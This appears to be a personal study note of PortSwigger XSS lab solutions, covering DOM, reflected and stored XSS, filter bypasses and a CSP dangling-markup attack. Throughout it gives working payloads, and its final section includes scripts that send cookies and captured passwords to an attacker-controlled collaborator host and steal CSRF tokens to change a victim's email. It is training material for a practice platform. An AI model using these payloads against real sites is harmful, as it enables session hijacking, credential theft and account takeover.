**Table of Contents**

- [Error](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#Error)
- [Which sinks can lead to DOM-XSS vulns?](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#Which%20sinks%20can%20lead%20to%20DOM-XSS%20vulns?)
- [DOM Labs](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#DOM%20Labs)
- [DOM XSS in jQuery anchor `href` attribute sink using `location.search` source](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#DOM%20XSS%20in%20jQuery%20anchor%20`href`%20attribute%20sink%20using%20`location.search`%20source)
- [Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element](#Lab:%20DOM%20XSS%20in%20%60document.write%60%20sink%20using%20source%20%60location.search%60%20inside%20a%20select%20element)
- [Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](#Lab:%20DOM%20XSS%20in%20AngularJS%20expression%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded)
- [Lab: Reflected DOM XSS](#Lab:%20Reflected%20DOM%20XSS)
- [Lab: Stored DOM XSS](#Lab:%20Stored%20DOM%20XSS)
- [Breaking out of a string](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#Breaking%20out%20of%20a%20string)
- [Making Use of HTML Encoding](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#Making%20Use%20of%20HTML%20Encoding)
- [XSS In JavaScript template literals](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#XSS%20In%20JavaScript%20template%20literals)
- [Reflected Labs](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#Reflected%20Labs)
- [Lab: Reflected XSS with angle brackets encoded](#Lab:%20Reflected%20XSS%20with%20angle%20brackets%20encoded)
- [Lab: Reflected XSS into a JavaScript string with angle bracket HTML encoded](#Lab:%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20bracket%20HTML%20encoded)
- [Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#Lab:%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20escaped)
- [Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](#Lab:%20Stored%20XSS%20into%20%60onclick%60%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped)
- [Lab: Reflected XSS into HTML context with most tags and attributes blocked](#Lab:%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked)
- [Lab: Reflected XSS into HTML context with all tags blocked except custom ones](#Lab:%20Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones)
- [Lab: Reflected XSS with some SVG markup allowed](#Lab:%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed)
- [Lab: Reflected XSS in canonical link tag](#Lab:%20Reflected%20XSS%20in%20canonical%20link%20tag)
- [Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped](#Lab:%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped)
- [Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](#Lab:%20Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks%20Unicode-escaped)
- [Lab: Reflected XSS protected by very strict CSP, with dangling markup attack](#Lab:%20Reflected%20XSS%20protected%20by%20very%20strict%20CSP,%20with%20dangling%20markup%20attack)
	- [Walkthrough](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#Walkthrough)
	- [All in One Answer](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#All%20in%20One%20Answer)
- [Stored Labs](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#Stored%20Labs)
- [Stored XSS into anchor `href` attribute with double quotes HTML-encoded](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#Stored%20XSS%20into%20anchor%20`href`%20attribute%20with%20double%20quotes%20HTML-encoded)
- [Other Labs](4%20-%20Web_Application/02-Client-Side/XSS%20-%20Cross-Site%20Scripting.md#Other%20Labs)
- [Lab: Exploiting cross-site scripting to steal cookies](#Lab:%20Exploiting%20cross-site%20scripting%20to%20steal%20cookies)
- [Lab: Exploiting cross-site scripting to capture passwords](#Lab:%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords)
- [Lab: Exploiting XSS to bypass CSRF defenses](#Lab:%20Exploiting%20XSS%20to%20bypass%20CSRF%20defenses)
[Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)


Break of `img` attribute (or others) by using `">` to terminate the source and then adding the XSS
- `"><svg onload=alert(1)>`
- `"><script>alert("1")</script>`
### Error
`<img src=1 onerror=alert(1)>`
- The `src` throws an error, so that triggers the `onerror` 

# DOM
DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value (`source`), and passes it into a dangerous function (`sink`), this could support code execution link `eval()` or `innerHTML`.

The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object. 

Place a random alphanumeric string into the source (such as `location.search`), then use devtools (not view-source, which won't account for dynamic changes to HTML) to inspect the HTML and find where your string appears.

## Which sinks can lead to DOM-XSS vulns?
The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

```js
document.write() 
document.writeln() 
document.domain 
element.innerHTML 
element.outerHTML 
element.insertAdjacentHTML 
element.onevent
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```js
add() 
after() 
append() 
animate() 
insertAfter() 
insertBefore() 
before() 
html() 
prepend() 
replaceAll() 
replaceWith() 
wrap() 
wrapInner() 
wrapAll() 
has() 
constructor() 
init() 
index() 
jQuery.parseHTML() 
$.parseHTML()
```

## DOM Labs
### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
- 1. [YouTube](https://www.youtube.com/watch?v=5OiWO5Qr-iI) 2.[Crypto-Cat Writeup](https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md)
- The jQuery code `$('#backLink').attr("href")` gets the value of the `href` attribute for the HTML element with the ID `backLink`. 
	- `$('#backLink')`: This is a jQuery selector that targets a specific HTML element on the page. The hash symbol `#` indicates that it is searching for an element with a matching ID, in this case, an element with `id="backLink"`.
	- `.attr("href")`: This is a jQuery method that interacts with the attributes of the selected element(s).
	    - When called with one argument (the attribute name, `"href"`), it returns the value of that attribute for the first element in the selection.
	    - When called with two arguments, it sets the value of the specified attribute.
- Note that `window.location.search` is from the URL bar
- img tag, script tag, but consider the sink or context
	- The context is that we are inside the href attribute, stuck the because of how jQuery works
		- `javascript:`
- JQuery is pre-fixed by `$`
- `<section class="blog-list">` will show as `section.blog-list` in the JQuery
- `/#<img src=o onerror='alert()'>`

### Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

1. On the product pages, notice that the dangerous JavaScript extracts a `storeId` parameter from the `location.search` source. It then uses `document.write` to create a new option in the select element for the stock checker functionality.
2. Add a `storeId` query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.
3. In the browser, notice that your random string is now listed as one of the options in the drop-down list.
4. Right-click and inspect the drop-down list to confirm that the value of your `storeId` parameter has been placed inside a select element.
5. Change the URL to include a suitable XSS payload inside the `storeId` parameter as follows:
    `product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`
    - Search the `location.search` in the browser console 
	    - In this case it was returning `?productId=1`
	    - But if we try `?productId=1&test=test`, test shows up outside the dropdown
	    - `</select>` gets us outside of the dropdown

### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Literally just googled and saw this: 
`{{$on.constructor('alert(1)')()}}`
- Put in in the search bar, presto
- ==View the page source and observe that your random string is enclosed in an `ng-app` directive.==

### Lab: Reflected DOM XSS
**Notice that a search is reflected in a JSON response called `search-results`**. 
- ==From the Site Map, notice and open the `searchResults.js` file and notice that the JSON response is used with an `eval()` function call.==
- Experiment with different search strings and identify that the JSON response is escaping `"`'s but not `\`'s. 
- `\"-alert(1)}//`
- Because the site isn't escaping the `\` and the site isn't escaping them, it adds a second backslash. The *resulting double-backslash* **causes the escaping to be effectively canceled out**. This means that the double-quotes are processed *unescaped*, which closes the string that should contain the search term. ==Result==
- `{"searchTerm":"\\"-alert(1)}//", "results":[]}`
- ==In JavaScript, the dash (hyphen) in ==`-alert(1)` ==serves as a **unary negation operator**==. 
	- In order to negate it, **it must first be evaluated**. 

### Lab: Stored DOM XSS
See this in the `/resources/js/loadCommentsWithVulnerableEscapeHtml.js`:
```js
    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```
- This encodes angle bracket with the `replace()` function
	- **But only the first occurrence**, subsequent angle brackets will be unaffected
	- `<><img src=1 onerror=alert(1)>`
		- Pops an alert and shows `<>` in the comment (the first occurrence which was encoded)




# Reflected
Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

## Breaking out of a string
When characters are fully restricted - WAF that prevents your requests from ever reaching the website for example. 
- Experiment with other ways of calling functions which bypass these security measures. 
	- One way of doing this is to use the `throw` statement with an exception handler. This enables you to pass arguments to a function without using parentheses. 
	- The following code assigns the `alert()` function to the global exception handler and the `throw` statement passes the `1` to the exception handler (in this case `alert`). The end result is that the `alert()` function is called with `1` as an argument.
`onerror=alert;throw 1`

There are multiple ways of using this technique to call [functions without parentheses](https://portswigger.net/research/xss-without-parentheses-and-semi-colons).

## Making Use of HTML Encoding
When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, *it is possible to make use of HTML-encoding to work around some input filters.* If the server-side application blocks /sanitizes certain characters necessary for the XSS , you can often bypass the input validation by **HTML-encoding those characters**. Ex:
- If the XSS context is: `<a href="#" onclick="... var input='controllable data here'; ...">` and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:
- `&apos;-alert(document.domain)-&apos;`
- Because the browser HTML-decodes the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.

## XSS In JavaScript template literals

**JavaScript template literals** - string literals that allow embedded JavaScript expressions. They are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax. Ex:
- ``document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;``
	- It's the "Welcome" + expression part
- When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the `${...}` syntax to embed a JavaScript expression that will be executed when the literal is processed. Ex:
- `${alert(document.domain)}` inside:
```JS
<script>
 ... 
 var input = `controllable data here`; 
 ... 
 </script>
```

## Reflected Labs

### Lab: Reflected XSS with angle brackets encoded 
`"onmouseover='alert(1)'` or `"onmousemove='alert(1)'`
- maybe this just means that the angle brackets are already there like this: `< xss example>`
	- but there are also quotes, so `script>alert('popped')</script` doesn't work because it would show as `'script>alert('popped')</script'`
### Lab: Reflected XSS into a JavaScript string with angle bracket HTML encoded
`'-alert(1)-'`

### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
`\';alert(document.domain)//` per [contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- gets converted to `\\';alert(document.domain)//`
- *first* `\` *means that the second is treated literally, allowing the* `'` *to be executed as a string terminator*
- if we put `';alert(document.domain)//`, it would get translated to `\';alert(document.domain)//` (on the backend)
- **But it would should it the web page as:** `'';alert(document.domain)//'`
	- The single `'`'s  around both sides are intentional quotes by the web page to show that you searched for `';alert(document.domain)//`
	- The correct answer translates to `'\\';alert(document.domain)//'` on the backend

### Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

![](/assets/images/XSS/onclick_event_in_website.png)

- Notice that when you make a comment, the website input is inside an `onclick` event
- This will bypass the filtering requiring a website while the apostrophe will be decoded from HTML: `http://foo?&apos;-alert(1)-&apos;`
	- Posting a `\` will get a second to show in the webpage like `\\`
	- Posting a `<>123` will show as `&lt;&gt;123`
	- *You may have to submit it from the browser*

### Lab: Reflected XSS into HTML context with most tags and attributes blocked
1. Search something
2. In Burp Intruder, replace the value of the search term with: `<>` and add as payload `<§§>`, then use the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy tags to clipboard**.
3. Note that the `body` payload caused a `200` response.
4. Go back to Burp Intruder and replace your search term with:
    `<body%20=1>`
5. Place the cursor before the `=` character and click **Add §** to create a payload position. The value of the search term should now look like: `<body%20§§=1>`
6. Visit the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click **Copy events to clipboard**.
7. Note that most payloads caused a `400` response, but the `onresize` payload caused a `200` response.
8. Go to the **exploit server** and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`ssssss

==Key thing here was to remember the cheat sheet to see what tags and events could be used.== (And to use the exploit server)

### Lab: Reflected XSS into HTML context with all tags blocked except custom ones
- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and generate CSRF PoC
- Cheat sheet has custom tags, pick one of those

### Lab: Reflected XSS with some SVG markup allowed
- More cheat sheet stuff
- Replace value of search term with `<>` and then place tags from cheat sheet inside
- ==Next replace search term with `<svg><animatetransform%20=1>`== because `svg` and `animatetransform` tags are allowed. 
	- position is `20<here>=1`
- paylod is events from cheat sheet now
- `https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

### Lab: Reflected XSS in canonical link tag
See that injecting an arbitrary string into the URL creates a canonical link in the `head` of the source code:
![](/assets/images/XSS/canonical_link_in_source.png)
We can create something like an `onclick` here, but it won't be clicked because it can't be seen in the page (*bc it's in the head*)
We must make the canonical link look like [this](https://portswigger.net/research/xss-in-hidden-input-fields):
- `<link rel="canonical" accesskey="X" onclick="alert(1)" />`
- ==except apparently it needs to be single==`'`s==after having tried it with==`"`'s. 
- **This will take some fiddling, but it looks like this:**
- `https://LABID.web-security-academy.net/?%27accesskey=%27X%27onclick=%27alert(1)`
	- Can just put it like `?'accesskey='x'onclick='alert(1)`
	- The source code does seem to add a `'` in a video so that's something to check out I guess, but it also translates them to `"`'s in my version

### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
`</script><img src=1 onerror=alert(1)>`
- This payload is suggested [here](https://portswigger.net/web-security/cross-site-scripting/contexts). ==The important part is that you are closing the existing script with==`</script>. 

### Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
Literally just `${alert(document.domain)}` per the [material](https://portswigger.net/web-security/cross-site-scripting/contexts)

==Notice when you search the string that it appears twice in the code - in the URL and here:== 
![](/assets/images/XSS/template_literal.png)
- **Notice that this string is designated by backticks** - That makes it a template literal
- Then you can use the `${alert(document.domain)}` or whatever inside the search

### Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

#### Walkthrough
[This blog](https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/) goes into a lot of detail.

1. You need the CSRF token to change the email. ==Notice this by putting anything in the email field and checking the source==. 
2. Also notice that you can bypass client-side validation (your email must be a `string@string.com`) by changing the type in the form from email to text:
![](/assets/images/XSS/change_email_type_from_email_to_text.png)
- This allows us to post the `foo@example.com"><img src= onerror=alert(1)>`, but it doesn't execute

3. **Next** check for weaknesses in the CSP, such as a missing `form-action` directive. Ex:
`https://0ad2000d04dbac08858d769700ea0031.web-security-academy.net/my-account?email=foo@bar%22%3E%3Cbutton%20formaction=%22https://espn.com%22%3EClick%20me%3C/button%3E`
- **Note that the espn.com would be the exploit server, but it goes away after the lab is completed.**
- Make sure that you include the following:
	- An `email` query parameter (necessary to trigger the XSS vulnerability and inject the button)
	- An email in valid format to pass client-side validation. It must be closed with a `"` to prevent syntax errors and ensure the injected button becomes part of the HTML structure.
	- A button containing a `formaction` attribute pointing to the copied exploit server's URL. This directs the form submission to the exploit server when the button is clicked.

4. Notice that the CSRF token is not visible in the URL. This is because the form is ==submitted via the `POST` method, *which sends data in the body* rather than in the URL.==

5. Burp's official solution for the next step doesn't work, but [this blog post](https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/) makes a suggestion on how to get the CSRF in the URL. 
	1. `%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://<exploit-server>/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E` which is:

	2. `"></form><form class="login-form" name="evil-form" action="https://<exploit-server>/log" method="GET"><button class="button" type="submit"> Click me </button>`
	3. **Put it in the exploit server to get the CSRF token**
6. Here:
```js
<script>
location='https://0a3a006c041ba288822ff20900fa00c8.web-security-academy.net/my-account?email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://<exploit-server>/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E';
</script>
```

#### All in One Answer
```js
<body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://0ad2000d04dbac08858d769700ea0031.web-security-academy.net/";
const exploitServer = "https://exploit-0a85005504ddac8985f97583013000d0.exploit-server.net/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker1@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```
# Stored

## Stored Labs
### Stored XSS into anchor `href` attribute with double quotes HTML-encoded
- See input in Inspect as: `<a id="author" href="abc123">`
- Change input to `javascript:alert(1)`


# Other

## Other Labs

### Lab: Exploiting cross-site scripting to steal cookies
In a comment:
```js
<script> 
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { 
method: 'POST', 
mode: 'no-cors', 
body:document.cookie 
}); 
</script>
```
The key thing to notice here is that the cookie you are looking for is in the ==request== in Collaborator, because it's the victim doing the requesting. 

### Lab: Exploiting cross-site scripting to capture passwords
```html
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ 
method:'POST', 
mode: 'no-cors', 
body:username.value+':'+this.value 
});">
```
same as above, but in this case the form asks for input of username and pass word and the **onchange** part ensures that if they are entered then the request is sent in a `POST` request to the collaborator URL. 

### Lab: Exploiting XSS to bypass CSRF defenses
```JS
<script> 
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() { 
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
	var changeReq = new XMLHttpRequest(); 
	changeReq.open('post', '/my-account/change-email', true); 
	changeReq.send('csrf='+token+'&email=test@test.com') 
	}; 
</script>
```
**I would have never been able to do this**

==This is just a useful payload for stealing a named token, in this case ==`csrf` ==.== 

